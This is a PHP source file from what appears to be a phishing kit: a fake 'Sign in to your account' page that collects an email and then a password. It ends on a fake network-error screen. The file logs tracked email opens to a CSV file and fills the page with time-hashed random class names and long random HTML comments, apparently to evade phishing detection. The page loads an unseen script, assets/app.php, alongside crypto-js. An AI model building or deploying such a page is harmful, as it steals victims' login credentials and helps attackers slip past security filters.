<?php
function getName($n) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
 
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
 
    return $randomString;
}
if(isset($_GET['cache_xray_id'])){
    $handle = fopen("opens.csv", "a");
    $email = $_GET['cache_xray_id'];
    fputcsv($handle, [$email, $_SERVER['HTTP_USER_AGENT']]);
    fclose($handle);
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" class="<?php $name='class_charset'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
    <meta http-equiv="X-UA-Compatible" class="<?php $name='class_compatible'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" content="IE=edge">
    <meta name="viewport" class="<?php $name='class_viewport'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" content="width=device-width, initial-scale=1.0">
    <link rel="icon" class="<?php $name='class_icon'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" href="assets/logo.png"  />
    <title>Sign in to your account (<?php $name='SECP'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>)</title>
    <link rel="stylesheet" href="assets/app.css.php" />
</head>

<body class="<?php $name='class_body'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?> <?php echo getName(100);?>">

    
    <?php
        echo '<!---'.getName(1000).'---->';
    ?>
    <section id="section_uname">
        <div class="auth-wrapper <?php $name='class_auth_div_bigger'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
            <img src="assets/logo.png" alt="SECP" />
            <h2 class="title mb-16 mt-16 <?php $name='class_emailinput_h2'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?> <?php echo getName(100);?>">Sign in</h2>
            <?php
                echo '<!---'.getName(100).'---->';
            ?>
                <div class="<?php echo getName(100);?> mb-16 <?php $name='class_email_div'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                    <p id="error_uname" class="error <?php $name='class_error_email'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>"></p>
                    <input id="inp_uname" type="text" name="uname" class="input <?php $name='class_email_input'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" placeholder="Email" />
                </div>
            <?php
                echo '<!---'.getName(100).'---->';
            ?>
            <div>
                <button class="<?php echo getName(100);?> btn <?php $name='class_next_btuun'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" id="btn_next">Next</button>
            </div>
            <?php
                echo '<!---'.getName(100).'---->';
            ?>
        </div>
    </section>
    <?php
        echo '<!---'.getName(1000).'---->';
    ?>

    <section id="section_pwd" class="d-none <?php $name='class_section_pwd'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
        <?php
            echo '<!---'.getName(1000).'---->';
        ?>
        <div class="<?php echo getName(100);?> auth-wrapper <?php $name='class_auth_div'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
            <img src="assets/logo.png" alt="SECP" class="d-block <?php $name='class_logo_img'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" />
            <div class="identity w-100 mt-16 mb-16 <?php $name='class_identity_div'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                <button class="back <?php $name='class_back_button'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                    <img src="assets/back.png" class="<?php $name='class_back_png_img'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" />
                </button>
                <span id="user_identity"><?php $name='email'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?></span>
            </div>
            <h2 class="title mb-16 <?php $name='class_title_h2'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">Enter password</h2>
            
                <div class="<?php echo getName(100);?> mb-16 <?php $name='class_div_mb'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                    <p id="error_pwd" class="error <?php $name='class_wrror_pwd'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input <?php $name='class_inp_btn'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" placeholder="Password" />
                </div>
            
            <div>
                <button class="btn <?php $name='class_btn'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>
    <?php
        echo '<!---'.getName(1000).'---->';
    ?>

    <section id="section_final" class="d-none <?php $name='class_section'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
        <div class="auth-wrapper <?php $name='class_div_auth_wrapper'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
            <img src="assets/logo.png" alt="SECP" class="d-block <?php $name='class_img_logo'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>" />
            <div class="identity w-100 mt-16 mb-16 <?php $name='class_identity'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                <span id="user_identity"><?php echo 'random123'.hash('ripemd160', date("h:i:sa").'btnrandomasdidasdads'); ?></span>
            </div>
            <h2 class="title mb-16 <?php $name='class_h2'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">Something went wrong!</h2>
            <p class="p">Network Error:<br>Stack Trace (<?php echo hash('ripemd160', date("h:i:sa")); ?>)<br>Line: <?php echo(rand(10,100)); ?> (app.js)</p>
            <div class="btn-group <?php $name='class_btn_group'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>">
                <button class="btn <?php echo 'btn'.hash('ripemd160', date("h:i:sa").'btn9999asdads'); ?> <?php echo 'btn2'.hash('ripemd160', date("h:i:sa").'btn9123123asdads'); ?>" id="btn_final">Retry</button>
            </div>
        </div>
    </section>
    <?php
        echo '<!---'.getName(1000).'---->';
    ?>
    <script src="assets/app.php" class="<?php $name='class_script'; echo $name.hash('ripemd160', date("h:i:sa").$name); ?>"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
</body>

</html>
<?php
    echo '<!---Autogenerated:'.getName(1000).'---->';
?>
